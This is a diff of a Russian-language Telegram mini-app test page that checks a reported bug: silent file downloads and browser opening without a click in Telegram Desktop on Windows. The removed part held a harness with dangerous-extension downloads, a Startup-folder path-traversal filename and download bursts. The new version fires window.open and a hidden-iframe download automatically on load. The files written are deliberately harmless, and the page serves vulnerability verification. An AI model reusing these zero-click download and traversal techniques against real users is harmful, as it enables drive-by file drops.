@@ -3,115 +3,28 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Проверка D1+D2: запись файла и открытие браузера</title>
+<title>Проверка D1+D2</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   body { margin: 0; padding: 16px; font: 15px/1.5 -apple-system, system-ui, sans-serif;
          background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); }
   h1 { font-size: 17px; margin: 0 0 4px; }
-  h2 { font-size: 15px; margin: 22px 0 6px; }
   .sub { color: var(--tg-theme-hint-color, #777); font-size: 13px; margin-bottom: 14px; }
-  .row { display: grid; grid-template-columns: 1fr auto; gap: 6px 12px; align-items: baseline;
-         border: 1px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; padding: 12px; margin-bottom: 12px; }
-  .row div:nth-child(even) { font-weight: 600; text-align: right; word-break: break-all; }
-  button { width: 100%; padding: 12px; margin: 6px 0; font-size: 15px; border-radius: 10px;
-           border: 0; background: var(--tg-theme-button-color, #2f81f7); color: var(--tg-theme-button-text-color, #fff); }
-  button.secondary { background: transparent; color: var(--tg-theme-button-color, #2f81f7);
-                     border: 1px solid var(--tg-theme-button-color, #2f81f7); }
-  button.warn { background: transparent; color: #c2410c; border: 1px solid #c2410c; }
-  select, input { width: 100%; padding: 10px; font: 14px/1.4 ui-monospace, Menlo, monospace;
-                  border-radius: 8px; border: 1px solid var(--tg-theme-hint-color, #ccc);
-                  background: var(--tg-theme-secondary-bg-color, #f7f7f7); color: inherit; box-sizing: border-box; }
-  label { display: block; font-size: 13px; color: var(--tg-theme-hint-color, #777); margin: 10px 0 4px; }
-  .target { font: 12px/1.45 ui-monospace, Menlo, monospace; word-break: break-all;
-            background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 8px;
-            padding: 8px; margin: 2px 0 10px; }
-  #countdown { font-size: 22px; font-weight: 700; text-align: center; margin: 4px 0 10px; }
+  button { width: 100%; padding: 12px; margin: 10px 0 0; font-size: 15px; border-radius: 10px;
+           border: 1px solid var(--tg-theme-button-color, #2f81f7); background: transparent;
+           color: var(--tg-theme-button-color, #2f81f7); }
   #log { white-space: pre-wrap; word-break: break-word; font: 12px/1.45 ui-monospace, Menlo, monospace;
-         background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 10px; padding: 10px; margin-top: 12px; }
+         background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 10px; padding: 10px; }
 </style>
 </head>
 <body>
-<h1>D1 + D2: запись файла и открытие браузера</h1>
-<div class="sub">Репорт evilcode про мини-апп в Telegram Desktop на Windows. Заявлено два
-поведения: файл сохраняется в «Загрузки» без диалога (D1) и системный браузер открывается
-без нажатия внутри мини-аппа (D2). Проверяем оба и меряем то, чего в репорте нет, —
-живёт ли в момент выстрела «пользовательская активация».</div>
+<h1>Проверка D1+D2</h1>
+<div class="sub">Ничего нажимать не надо. Через секунду после открытия страница сама
+откроет системный браузер (D2) и запросит файл <code>hello.html</code> (D1) — ровно как
+в репорте. Смотреть: открылся ли браузер и появился ли файл в «Загрузках».</div>
 
-<div class="row">
-  <div>Платформа моста</div><div id="platform">—</div>
-  <div>Версия моста</div><div id="version">—</div>
-  <div>Движок</div><div id="engine">—</div>
-  <div>Активация сейчас</div><div id="activation">—</div>
-</div>
-<button id="btn-activation" class="secondary">Обновить состояние активации</button>
-<div class="target">Главная цифра проверки. На Windows открытие нового окна разрешено
-только при <code>isUserInitiated</code>, а это ровно транзиентная активация Chromium —
-она живёт 5 секунд после нажатия. Выстрел через 3 секунды в неё ещё попадает, через 6 —
-уже нет. Если браузер открывается при <code>isActive: false</code>, проверка жеста не
-работает. Если только при <code>true</code> — работает, и репорт объясняет эффект неверно.</div>
-
-<h2>D2. Открытие системного браузера</h2>
-
-<button id="d2-now">1. window.open сразу по нажатию</button>
-<div class="target">Контроль. Жест свежий, активация заведомо жива. Здесь браузер
-открываться и должен — на всех платформах.</div>
-
-<label for="delay">Задержка, с</label>
-<input id="delay" type="number" min="0" max="60" step="1" value="6">
-<button id="d2-delay">2. window.open через N секунд после нажатия</button>
-<div id="countdown">—</div>
-<div class="target">Случай автора — у него 3 секунды. Прогнать 3 и 6: до пяти секунд
-активация жива и выстрел ничего не доказывает, после пяти — доказывает.</div>
-
-<button id="d2-reload" class="secondary">3. Без единого нажатия: перезагрузить и выстрелить</button>
-<div class="target">Страница перезагрузится и выстрелит сама. В новом документе нажатий
-не было вообще, активации нет по определению. Самый чистый вариант «0-click».</div>
-
-<button id="d2-anchor" class="secondary">4. Для сравнения: синтетический клик по &lt;a target="_blank"&gt;</button>
-<div class="target">Другой путь в ту же ручку. Бывает, что окно открывается отсюда,
-а из window.open — нет.</div>
-
-<button id="d2-location" class="secondary">5. Для сравнения: смена location.href</button>
-<div class="target">Не новое окно, а переход главного кадра — в клиенте это отдельное
-решение. Мини-апп после него может просто уехать на чужой адрес внутри себя.</div>
-
-<h2>D1. Запись файла</h2>
-
-<label for="ext">Расширение</label>
-<select id="ext"></select>
-<label for="fname">Имя файла</label>
-<input id="fname" type="text" value="tso-poc">
-<div class="target" id="t-file"></div>
-
-<button id="d1-click">6. Скачать по нажатию (Blob + a[download])</button>
-<div class="target">Жест свежий. Проверяем сам факт: появится ли файл без диалога
-«куда сохранить» и переспросит ли клиент на опасном расширении.</div>
-
-<button id="d1-silent">7. Скачать без нажатия, через 6 секунд</button>
-<div class="target">Активации уже нет. Если файл всё равно лёг в «Загрузки» — это и есть
-заявленная тихая запись.</div>
-
-<label for="burst">Сколько файлов в залпе</label>
-<input id="burst" type="number" min="1" max="50" step="1" value="5">
-<button id="d1-burst" class="secondary">8. Залп: N файлов подряд</button>
-<div class="target">Отвечает на вопрос, которого нет в репорте: ограничивает ли клиент
-число файлов за раз. Каждый файл — несколько байт.</div>
-
-<button id="d1-traversal" class="secondary">9. Имя с выходом из папки</button>
-<div class="target">Имя <code>../../Startup/tso-poc.txt</code>. Автор пишет, что движок
-его чистит и файл остаётся в «Загрузках». Проверяем, так ли это здесь.</div>
-
-<label for="remote">Внешний адрес, отдающий Content-Disposition: attachment</label>
-<input id="remote" type="text" value="https://httpbin.org/response-headers?Content-Disposition=attachment%3B%20filename%3Dhello.html&Content-Type=text%2Fhtml&body=tso-poc">
-<button id="d1-remote" class="warn">10. Скачать через скрытый iframe на внешний адрес</button>
-<div class="target">Ровно шаг из репорта, но это единственная кнопка, которая ходит
-наружу — к httpbin.org. Остальные девять не отправляют ни байта: файлы собираются
-прямо в странице. Жать, только если нужен путь «навигация превратилась в загрузку»:
-он в клиенте отдельный от a[download].</div>
-
-<button id="btn-copy" class="secondary">Скопировать журнал</button>
 <div id="log"></div>
+<button id="copy">Скопировать журнал</button>
 
 <script>
 (function () {
@@ -120,227 +33,40 @@
   var lines = [];
 
   function say(text) {
-    lines.push(new Date().toISOString().slice(11, 23) + '  ' + text);
+    lines.push(new Date().toISOString().slice(11, 19) + '  ' + text);
     log.textContent = lines.join('\n');
-    log.scrollTop = log.scrollHeight;
   }
-  function set(id, value) { document.getElementById(id).textContent = value; }
-
-  // Транзиентная активация — это и есть то, что WebView2 отдаёт клиенту как
-  // IsUserInitiated. Читаем её сами и пишем в журнал перед каждым выстрелом:
-  // без этого «браузер открылся» ничего не значит, потому что непонятно,
-  // прошла проверка жеста или её просто не было кому провалить.
-  function activation() {
-    var ua = navigator.userActivation;
-    if (!ua) return 'нет API (не Chromium — значит и IsUserInitiated тут ни при чём)';
-    return 'isActive: ' + ua.isActive + ', hasBeenActive: ' + ua.hasBeenActive;
-  }
-
-  function engine() {
-    var ua = navigator.userAgent;
-    if (/Edg\//.test(ua)) return 'WebView2 (Chromium)';
-    if (/AppleWebKit/.test(ua) && !/Chrome/.test(ua)) return 'WKWebView (WebKit)';
-    if (/Chrome\//.test(ua)) return 'Chromium';
-    return ua.slice(0, 40);
-  }
-
-  var EXTENSIONS = [
-    ['txt',         'txt — по репорту сохраняется молча'],
-    ['html',        'html — по репорту сохраняется молча'],
-    ['bat',         'bat — по репорту переспрашивает'],
-    ['ps1',         'ps1 — по репорту переспрашивает'],
-    ['exe',         'exe — по репорту переспрашивает'],
-    ['hta',         'hta — по репорту переспрашивает'],
-    ['search-ms',   'search-ms — по репорту переспрашивает'],
-    ['library-ms',  'library-ms — по репорту переспрашивает'],
-    ['url',         'url — по репорту переименовывается в .download']
-  ];
-  var select = document.getElementById('ext');
-  EXTENSIONS.forEach(function (pair, i) {
-    var option = document.createElement('option');
-    option.value = String(i);
-    option.textContent = pair[1];
-    select.appendChild(option);
-  });
-
-  function ext() { return EXTENSIONS[Number(select.value)][0]; }
-  function fileName() {
-    var base = (document.getElementById('fname').value || 'tso-poc').trim();
-    return base + '.' + ext();
-  }
-  function showFile() { document.getElementById('t-file').textContent = fileName(); }
-  select.onchange = showFile;
-  document.getElementById('fname').oninput = showFile;
-
-  // Содержимое намеренно мёртвое: даже с расширением .bat или .ps1 это строка
-  // комментария. Проверяем запись файла, а не запуск чего-либо.
-  function payload(tag) {
-    return 'rem TSO PoC ' + tag + ' ' + new Date().toISOString()
-      + '\nrem Этот файл ничего не делает. Его можно удалить.\n';
-  }
-
-  function drop(name, tag) {
-    var url = URL.createObjectURL(new Blob([payload(tag)], { type: 'application/octet-stream' }));
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = name;
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function () {
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }, 4000);
-    say('  запросил файл ' + name + ' (' + activation() + ')');
-  }
-
-  function openWindow(note) {
-    var url = 'https://example.com/tso-poc-d2';
-    say('--- window.open(' + url + ')  ' + note);
-    say('    активация: ' + activation());
-    var result = null;
-    try {
-      result = window.open(url, '_blank');
-    } catch (error) {
-      say('    отказ: ' + error);
-      return;
-    }
-    say('    вернулось: ' + (result === null ? 'null' : typeof result)
-        + '. Смотри, открылся ли системный браузер.');
-  }
-
-  set('platform', (tg && tg.platform) || 'неизвестна');
-  set('version', (tg && tg.version) || '—');
-  set('engine', engine());
-  set('activation', activation());
-  showFile();
 
   say('платформа: ' + ((tg && tg.platform) || '?') + ', версия моста: ' + ((tg && tg.version) || '?'));
-  say('движок: ' + engine());
   say('userAgent: ' + navigator.userAgent);
-  say('активация при загрузке: ' + activation());
 
-  document.getElementById('btn-activation').onclick = function () {
-    set('activation', activation());
-    say('активация: ' + activation());
-  };
-
-  document.getElementById('d2-now').onclick = function () {
-    openWindow('жест свежий — контроль');
-  };
-
-  document.getElementById('d2-delay').onclick = function () {
-    var seconds = Math.max(0, Number(document.getElementById('delay').value) || 0);
-    var started = Date.now();
-    say('--- взвожу D2: выстрел через ' + seconds + ' с, дальше ничего не трогай');
-    var left = seconds;
-    document.getElementById('countdown').textContent = left || 'выстрел';
-    var timer = setInterval(function () {
-      left -= 1;
-      if (left > 0) {
-        document.getElementById('countdown').textContent = left;
-        return;
-      }
-      clearInterval(timer);
-      document.getElementById('countdown').textContent = 'выстрел';
-      var waited = Math.round((Date.now() - started) / 100) / 10;
-      openWindow('после нажатия прошло ' + waited + ' с'
-                 + (waited > 5 ? ' — за пределами окна активации' : ' — окно активации ещё живо'));
-    }, 1000);
-  };
-
-  document.getElementById('d2-reload').onclick = function () {
-    try { sessionStorage.setItem('tso-minidrop', 'd2'); } catch (e) {}
-    say('перезагружаюсь, после загрузки выстрелю без единого нажатия');
-    setTimeout(function () { location.reload(); }, 400);
-  };
-
-  document.getElementById('d2-anchor').onclick = function () {
-    say('--- синтетический клик по <a target="_blank">');
-    say('    активация: ' + activation());
-    var a = document.createElement('a');
-    a.href = 'https://example.com/tso-poc-anchor';
-    a.target = '_blank';
-    a.rel = 'noopener';
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function () { document.body.removeChild(a); }, 2000);
-    say('    клик отправлен');
-  };
-
-  document.getElementById('d2-location').onclick = function () {
-    var url = 'https://example.com/tso-poc-location';
-    say('--- location.href = ' + url + ' (переход главного кадра, не новое окно)');
-    say('    если мини-апп уехал на чужой адрес внутри себя — это тоже ответ');
-    setTimeout(function () { location.href = url; }, 600);
-  };
-
-  document.getElementById('d1-click').onclick = function () {
-    say('--- D1: скачивание по нажатию');
-    drop(fileName(), 'click');
-  };
-
-  document.getElementById('d1-silent').onclick = function () {
-    say('--- D1: взвожу тихое скачивание через 6 с, дальше ничего не трогай');
-    var name = fileName();
-    setTimeout(function () {
-      say('--- D1: выстрел без активации');
-      drop(name, 'silent');
-    }, 6000);
-  };
-
-  document.getElementById('d1-burst').onclick = function () {
-    var count = Math.min(50, Math.max(1, Number(document.getElementById('burst').value) || 1));
-    var base = (document.getElementById('fname').value || 'tso-poc').trim();
-    say('--- D1: залп из ' + count + ' файлов');
-    for (var i = 1; i <= count; i += 1) {
-      (function (index) {
-        setTimeout(function () { drop(base + '-' + index + '.' + ext(), 'burst'); }, index * 150);
-      })(i);
+  setTimeout(function () {
+    // D2: открытие системного браузера. Жеста внутри мини-аппа не было.
+    var result = null;
+    try {
+      result = window.open('https://example.com/', '_blank');
+      say('D2: window.open вернул ' + (result === null ? 'null' : typeof result));
+    } catch (error) {
+      say('D2: отказ — ' + error);
     }
-    say('    считать, сколько файлов реально легло и на каком клиент остановился');
-  };
 
-  document.getElementById('d1-traversal').onclick = function () {
-    say('--- D1: имя с выходом из папки');
-    drop('../../Startup/tso-poc.txt', 'traversal');
-    say('    смотреть, где файл оказался и как называется');
-  };
-
-  document.getElementById('d1-remote').onclick = function () {
-    var url = (document.getElementById('remote').value || '').trim();
-    if (!/^https:\/\//.test(url)) { say('нужен https-адрес'); return; }
-    say('--- D1: скрытый iframe на внешний адрес (ходит наружу)');
-    say('    ' + url);
-    say('    активация: ' + activation());
+    // D1: скрытый кадр на адрес, отдающий Content-Disposition: attachment.
+    // Внешний сервис нужен потому, что GitHub Pages заголовки ставить не умеет.
     var frame = document.createElement('iframe');
     frame.style.display = 'none';
-    frame.src = url;
+    frame.src = 'https://httpbin.org/response-headers'
+      + '?Content-Disposition=attachment%3B%20filename%3Dhello.html'
+      + '&Content-Type=text%2Fhtml&body=tso-poc';
     document.body.appendChild(frame);
-    setTimeout(function () { document.body.removeChild(frame); }, 8000);
-  };
+    say('D1: кадр на загрузку вставлен, файл hello.html');
+    say('смотреть «Загрузки» и системный браузер');
+  }, 1000);
 
-  document.getElementById('btn-copy').onclick = function () {
-    var text = lines.join('\n');
-    if (navigator.clipboard) navigator.clipboard.writeText(text).then(
+  document.getElementById('copy').onclick = function () {
+    if (navigator.clipboard) navigator.clipboard.writeText(lines.join('\n')).then(
       function () { say('журнал скопирован'); },
       function () { say('скопировать не вышло, выдели руками'); });
-    else say('буфер недоступен, выдели руками');
   };
-
-  // Выстрел в документе, где нажатий не было ни одного.
-  try {
-    var pending = sessionStorage.getItem('tso-minidrop');
-    if (pending === 'd2') {
-      sessionStorage.removeItem('tso-minidrop');
-      say('страница загрузилась заново, нажатий в ней не было');
-      setTimeout(function () {
-        openWindow('нажатий в документе не было ни одного');
-        setTimeout(function () { drop('tso-poc-noclick.txt', 'noclick'); }, 1500);
-      }, 1500);
-    }
-  } catch (e) {}
 
   if (tg && tg.ready) tg.ready();
   if (tg && tg.expand) tg.expand();
